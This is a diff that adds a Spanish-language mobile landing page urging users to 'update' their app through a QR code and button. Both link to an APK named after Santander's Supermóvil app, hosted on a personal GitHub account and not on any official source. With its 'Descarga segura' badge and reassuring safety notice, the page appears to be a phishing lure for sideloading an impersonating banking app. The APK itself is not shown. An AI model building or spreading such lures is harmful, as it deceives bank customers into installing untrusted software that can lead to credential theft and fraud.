@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Actualiza tu app</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;font-family:Inter,Arial,sans-serif;
+background:linear-gradient(145deg,#071b33,#0b4f8a 55%,#eef5fb);
+display:flex;align-items:center;justify-content:center;padding:22px;color:#122033}
+.card{width:min(440px,100%);background:rgba(255,255,255,.97);border-radius:28px;
+padding:30px 24px;box-shadow:0 20px 60px rgba(0,0,0,.28);text-align:center}
+.badge{display:inline-block;background:#e9f7ef;color:#167342;padding:8px 14px;
+border-radius:999px;font-size:13px;font-weight:700;margin-bottom:14px}
+h1{font-size:28px;line-height:1.15;margin:4px 0 12px}
+.lead{font-size:16px;line-height:1.55;color:#526174;margin:0 auto 20px;max-width:360px}
+.qr-wrap{background:#fff;border:1px solid #e4eaf0;border-radius:20px;padding:15px;
+box-shadow:0 8px 25px rgba(20,45,75,.10);margin:18px auto;max-width:320px}
+.qr{width:100%;display:block;border-radius:10px;cursor:pointer}
+.btn{display:block;background:#087443;color:#fff;text-decoration:none;font-weight:800;
+font-size:17px;padding:16px;border-radius:14px;box-shadow:0 8px 18px rgba(8,116,67,.25);
+margin-top:18px}
+.btn:hover{filter:brightness(1.05)}
+.notice{display:flex;gap:10px;text-align:left;background:#f3f7fb;border-radius:14px;
+padding:14px;margin-top:20px;font-size:13px;line-height:1.45;color:#536174}
+.icon{font-size:21px}
+.small{font-size:12px;color:#7b8796;margin-top:16px}
+</style>
+</head>
+<body>
+<main class="card">
+  <div class="badge">🔒 Descarga segura</div>
+  <h1>Mantén tu aplicación actualizada</h1>
+  <p class="lead">
+    Una aplicación actualizada puede ayudarte a contar con las correcciones y mejoras
+    de seguridad disponibles para esa versión.
+  </p>
+
+  <div class="qr-wrap">
+    <a href="https://github.com/luisfelipere3-art/Santander-Android/releases/download/V1.1.2/Santander.Supermovil.apk" aria-label="Descargar APK">
+      <img class="qr" src="data:image/png;base64,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" alt="Código QR de descarga">
+    </a>
+  </div>
+
+  <a class="btn" href="https://github.com/luisfelipere3-art/Santander-Android/releases/download/V1.1.2/Santander.Supermovil.apk">⬇️ DESCARGAR APLICACIÓN</a>
+
+  <div class="notice">
+    <div class="icon">🛡️</div>
+    <div>
+      <strong>Antes de instalar:</strong><br>
+      Comprueba que el enlace corresponde al que esperabas y descarga aplicaciones
+      únicamente de fuentes que reconozcas y confíes.
+    </div>
+  </div>
+
+  <div class="small">Toca el código QR o el botón para continuar.</div>
+</main>
+</body>
+</html>
